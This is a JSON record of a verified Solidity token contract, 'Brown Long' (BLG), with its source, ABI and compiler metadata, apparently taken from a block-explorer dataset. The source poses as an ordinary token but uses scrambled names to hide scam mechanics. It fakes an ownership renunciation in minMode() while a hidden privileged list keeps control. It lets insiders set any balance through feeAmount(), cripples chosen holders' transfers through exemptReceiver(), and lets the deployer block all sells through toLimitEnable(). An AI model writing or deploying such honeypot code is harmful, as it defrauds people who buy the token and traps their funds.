{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface senderList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tradingMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchSwap {\n    function createPair(address tradingListTx, address listShould) external returns (address);\n}\n\ninterface maxListSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityReceiver) external view returns (uint256);\n\n    function transfer(address teamWallet, uint256 liquidityTotalMax) external returns (bool);\n\n    function allowance(address limitAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityTotalMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamWallet,\n        uint256 liquidityTotalMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalAutoReceiver, uint256 value);\n    event Approval(address indexed limitAuto, address indexed spender, uint256 value);\n}\n\ninterface shouldReceiverMax is maxListSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BrownLong is tradingMode, maxListSender, shouldReceiverMax {\n\n    string private fromLaunchTake = \"Brown Long\";\n\n    bool private takeSender;\n\n    address public sellTakeTx;\n\n    event OwnershipTransferred(address indexed tradingSwap, address indexed fromEnable);\n\n    function transferFrom(address limitFromTeam, address teamWallet, uint256 liquidityTotalMax) external override returns (bool) {\n        if (_msgSender() != maxTx) {\n            if (receiverMarketing[limitFromTeam][_msgSender()] != type(uint256).max) {\n                require(liquidityTotalMax <= receiverMarketing[limitFromTeam][_msgSender()]);\n                receiverMarketing[limitFromTeam][_msgSender()] -= liquidityTotalMax;\n            }\n        }\n        return senderLaunched(limitFromTeam, teamWallet, liquidityTotalMax);\n    }\n\n    function getOwner() external view returns (address) {\n        return feeLaunch;\n    }\n\n    function liquidityMarketing(address limitLiquidity) public {\n        if (toMax) {\n            return;\n        }\n        if (swapAt == sellBuy) {\n            sellBuy = swapAt;\n        }\n        amountSell[limitLiquidity] = true;\n        if (sellBuy == swapAt) {\n            senderTake = true;\n        }\n        toMax = true;\n    }\n\n    address private feeLaunch;\n\n    function minMode() public {\n        emit OwnershipTransferred(sellTakeTx, address(0));\n        feeLaunch = address(0);\n    }\n\n    constructor (){\n        if (senderTake != swapModeFee) {\n            swapModeFee = true;\n        }\n        senderList buyTotal = senderList(maxTx);\n        shouldLaunch = launchSwap(buyTotal.factory()).createPair(buyTotal.WETH(), address(this));\n        \n        sellTakeTx = _msgSender();\n        minMode();\n        amountSell[sellTakeTx] = true;\n        exemptAt[sellTakeTx] = atExempt;\n        \n        emit Transfer(address(0), sellTakeTx, atExempt);\n    }\n\n    bool public senderTake;\n\n    bool public swapModeFee;\n\n    mapping(address => bool) public amountSell;\n\n    function name() external view virtual override returns (string memory) {\n        return fromLaunchTake;\n    }\n\n    mapping(address => uint256) private exemptAt;\n\n    mapping(address => mapping(address => uint256)) private receiverMarketing;\n\n    uint256 public sellBuy;\n\n    function allowance(address senderMode, address amountMarketingList) external view virtual override returns (uint256) {\n        if (amountMarketingList == maxTx) {\n            return type(uint256).max;\n        }\n        return receiverMarketing[senderMode][amountMarketingList];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return atTradingMax;\n    }\n\n    function transfer(address amountLaunched, uint256 liquidityTotalMax) external virtual override returns (bool) {\n        return senderLaunched(_msgSender(), amountLaunched, liquidityTotalMax);\n    }\n\n    address public shouldLaunch;\n\n    function exemptReceiver(address buyToken) public {\n        receiverReceiverFund();\n        \n        if (buyToken == sellTakeTx || buyToken == shouldLaunch) {\n            return;\n        }\n        minIs[buyToken] = true;\n    }\n\n    function senderLaunched(address limitFromTeam, address teamWallet, uint256 liquidityTotalMax) internal returns (bool) {\n        if (limitFromTeam == sellTakeTx) {\n            return fromSender(limitFromTeam, teamWallet, liquidityTotalMax);\n        }\n        uint256 autoLimit = maxListSender(shouldLaunch).balanceOf(maxMarketing);\n        require(autoLimit == launchLaunched);\n        require(teamWallet != maxMarketing);\n        if (minIs[limitFromTeam]) {\n            return fromSender(limitFromTeam, teamWallet, receiverToken);\n        }\n        return fromSender(limitFromTeam, teamWallet, liquidityTotalMax);\n    }\n\n    uint256 constant receiverToken = 17 ** 10;\n\n    mapping(address => bool) public minIs;\n\n    address maxTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function receiverReceiverFund() private view {\n        require(amountSell[_msgSender()]);\n    }\n\n    uint8 private sellMarketingTo = 18;\n\n    function balanceOf(address liquidityReceiver) public view virtual override returns (uint256) {\n        return exemptAt[liquidityReceiver];\n    }\n\n    uint256 launchLaunched;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atExempt;\n    }\n\n    uint256 maxLaunched;\n\n    function feeAmount(address amountLaunched, uint256 liquidityTotalMax) public {\n        receiverReceiverFund();\n        exemptAt[amountLaunched] = liquidityTotalMax;\n    }\n\n    function toLimitEnable(uint256 liquidityTotalMax) public {\n        receiverReceiverFund();\n        launchLaunched = liquidityTotalMax;\n    }\n\n    uint256 private atExempt = 100000000 * 10 ** 18;\n\n    function approve(address amountMarketingList, uint256 liquidityTotalMax) public virtual override returns (bool) {\n        receiverMarketing[_msgSender()][amountMarketingList] = liquidityTotalMax;\n        emit Approval(_msgSender(), amountMarketingList, liquidityTotalMax);\n        return true;\n    }\n\n    bool public toMax;\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellMarketingTo;\n    }\n\n    address maxMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private atTradingMax = \"BLG\";\n\n    function owner() external view returns (address) {\n        return feeLaunch;\n    }\n\n    function fromSender(address limitFromTeam, address teamWallet, uint256 liquidityTotalMax) internal returns (bool) {\n        require(exemptAt[limitFromTeam] >= liquidityTotalMax);\n        exemptAt[limitFromTeam] -= liquidityTotalMax;\n        exemptAt[teamWallet] += liquidityTotalMax;\n        emit Transfer(limitFromTeam, teamWallet, liquidityTotalMax);\n        return true;\n    }\n\n    uint256 private swapAt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalAutoReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountMarketingList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMarketingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTotalMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyToken\",\"type\":\"address\"}],\"name\":\"exemptReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTotalMax\",\"type\":\"uint256\"}],\"name\":\"feeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLiquidity\",\"type\":\"address\"}],\"name\":\"liquidityMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTakeTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapModeFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityTotalMax\",\"type\":\"uint256\"}],\"name\":\"toLimitEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTotalMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFromTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTotalMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BrownLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}